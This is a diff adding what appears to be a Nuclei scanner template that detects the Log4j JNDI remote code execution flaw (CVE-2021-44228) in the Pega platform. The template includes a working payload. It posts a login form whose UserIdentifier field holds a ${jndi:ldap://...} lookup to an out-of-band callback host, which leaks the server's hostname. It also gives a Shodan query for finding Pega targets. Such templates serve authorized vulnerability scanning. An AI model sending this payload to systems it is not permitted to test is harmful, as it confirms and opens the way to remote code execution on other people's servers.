@@ -1,0 +1,78 @@
+id: pega-log4j-rce
+
+info:
+  name: Pega - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Pega is susceptible to Log4j JNDI remote code execution. Pega provides a powerful low-code platform that empowers the world's leading enterprises to Build for Change.
+  reference:
+    - https://docs.pega.com/security-advisory/security-advisory-apache-log4j-zero-day-vulnerability
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:pega:platform:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+    shodan-query: title:"Pega"
+    product: platform
+    vendor: pega
+  tags: cve,cve2021,rce,jndi,log4j,pega,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /prweb/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+      - |
+        POST {{location}} HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Referer: {{location}}
+        Content-Type: application/x-www-form-urlencoded
+
+        pzAuth=guest&UserIdentifier=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&Password=a&pyActivity%3DCode-Security.Login=&lockScreenID=&lockScreenPassword=&newPassword=&confirmNewPassword=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: kval
+        name: location
+        part: header_1
+        kval:
+          - location
+        internal: true
+# digest: 490a00463044022001a6a5bb88f7c828bd0b7e2866b5f461e9a8a4932fdbc3ffb6349287e7a4f5cb0220675540dee56e4c27731b8655d085bcef59b99ecd249c434c6ae9b7bd2f9fa19c:922c64590222798bb761d5b6d8e72950
